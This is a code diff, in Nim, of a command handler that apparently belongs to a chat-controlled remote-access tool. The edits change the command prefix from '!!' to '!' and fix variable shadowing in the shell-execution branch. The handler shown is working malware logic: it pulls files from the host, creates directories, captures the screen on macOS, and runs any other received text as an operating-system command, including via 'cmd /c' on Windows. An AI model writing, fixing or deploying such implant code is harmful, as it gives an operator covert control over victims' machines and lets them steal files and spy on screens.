@@ -102,7 +102,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
       except CatchableError as e:
         return "failed to download file: " & e.msg
 
-  elif cmd.startsWith("!!download "):
+  elif cmd.startsWith("!download "):
     let fileName = cmd[9..^1].strip()
     let filePath = os.joinPath(currentDir, fileName)
     if fileExists(filePath):
@@ -111,7 +111,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
     else:
       return "file not found: " & filePath
 
-  elif cmd.startsWith("!!mkdir "):
+  elif cmd.startsWith("!mkdir "):
     let dirName = cmd[6..^1].strip()
     let dirPath = os.joinPath(currentDir, dirName)
     try:
@@ -147,7 +147,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
     else:
       return "no such file or directory: " & path
 
-  elif cmd == "!!screencapture":
+  elif cmd == "!screencapture":
     when defined(macosx):
       let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
       let filePath = os.joinPath(currentDir, fileName)
@@ -181,11 +181,11 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
 
   else:
     try:
-      let command = cmd[1..^1]
+      var command = cmd[1..^1]
       when defined(macosx):
         return await runCommandWithTimeoutKill(command, 60000)
       elif defined(windows):
-        let command = "cmd /c " & command
+        command = "cmd /c " & command
         return await runCommandWithTimeoutKill(command, 60000)
       else:
         return "unsupported platform for direct command execution."
